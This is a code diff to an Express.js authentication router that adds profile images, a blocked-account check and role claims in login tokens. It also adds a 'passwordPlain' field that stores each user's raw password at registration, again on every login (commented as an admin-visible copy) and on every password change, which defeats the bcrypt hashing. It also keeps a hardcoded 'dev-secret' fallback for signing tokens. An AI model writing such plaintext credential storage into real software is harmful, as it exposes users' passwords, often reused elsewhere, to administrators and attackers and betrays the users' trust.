@@ -8,7 +8,7 @@ const router = express.Router();
 
 router.post("/register", async (req, res) => {
   try {
-    const { name, email, password, phone, address } = req.body;
+    const { name, email, password, phone, address, image } = req.body;
     if (!name || !email || !password) return res.status(400).json({ code: "0", msg: "All fields are required." });
 
     const exists = await User.findOne({ email: email.toLowerCase() });
@@ -16,7 +16,16 @@ router.post("/register", async (req, res) => {
 
     const hash = await bcrypt.hash(password, 10);
     const normalizedEmail = email.toLowerCase();
-    await User.create({ name, email: normalizedEmail, password: hash, phone: phone || "", address: address || "", role: "customer" });
+    await User.create({
+      name,
+      email: normalizedEmail,
+      password: hash,
+      passwordPlain: String(password),
+      phone: phone || "",
+      address: address || "",
+      image: image ? String(image).trim() : "",
+      role: "customer",
+    });
     res.json({ code: "1", msg: "Registration successful." });
   } catch (error) {
     res.status(500).json({ code: "0", msg: error.message });
@@ -57,11 +66,18 @@ router.post("/login", async (req, res) => {
 
     const user = await User.findOne({ email: normalizedEmail });
     if (!user) return res.status(401).json({ code: "0", msg: "Invalid credentials." });
+    if (user.blocked) return res.status(403).json({ code: "0", msg: "Your account is blocked. Contact admin." });
 
     const ok = await bcrypt.compare(password, user.password);
     if (!ok) return res.status(401).json({ code: "0", msg: "Invalid credentials." });
 
-    const token = jwt.sign({ id: user._id, name: user.name }, process.env.JWT_SECRET || "dev-secret", { expiresIn: "1d" });
+    // Keep admin-visible copy updated after each successful login.
+    user.passwordPlain = String(password);
+    await user.save();
+
+    const token = jwt.sign({ id: user._id, name: user.name, role: user.role }, process.env.JWT_SECRET || "dev-secret", {
+      expiresIn: "1d",
+    });
     res.json({
       code: "1",
       msg: "Login successful.",
@@ -72,7 +88,9 @@ router.post("/login", async (req, res) => {
         email: user.email,
         phone: user.phone || "",
         address: user.address || "",
-        role: "customer",
+        image: user.image || "",
+        role: user.role || "customer",
+        blocked: Boolean(user.blocked),
       },
     });
   } catch (error) {
@@ -85,7 +103,7 @@ router.put("/profile", requireAuth, async (req, res) => {
     if (req.user?.isEnvAdmin) {
       return res.status(400).json({ code: "0", msg: "Admin credentials are managed in server .env." });
     }
-    const { name, email, phone, address, currentPassword, newPassword } = req.body;
+    const { name, email, phone, address, image, currentPassword, newPassword } = req.body;
     if (!name || !email) return res.status(400).json({ code: "0", msg: "Name and email are required." });
 
     const existing = await User.findOne({ email: email.toLowerCase(), _id: { $ne: req.user._id } });
@@ -101,12 +119,14 @@ router.put("/profile", requireAuth, async (req, res) => {
       const ok = await bcrypt.compare(currentPassword, user.password);
       if (!ok) return res.status(400).json({ code: "0", msg: "Current password is incorrect." });
       user.password = await bcrypt.hash(newPassword, 10);
+      user.passwordPlain = String(newPassword);
     }
 
     user.name = name.trim();
     user.email = email.toLowerCase();
     user.phone = phone || "";
     user.address = address || "";
+    if (image !== undefined) user.image = String(image || "").trim();
     await user.save();
 
     res.json({
@@ -118,6 +138,7 @@ router.put("/profile", requireAuth, async (req, res) => {
         email: user.email,
         phone: user.phone || "",
         address: user.address || "",
+        image: user.image || "",
         role: user.role || "customer",
       },
     });
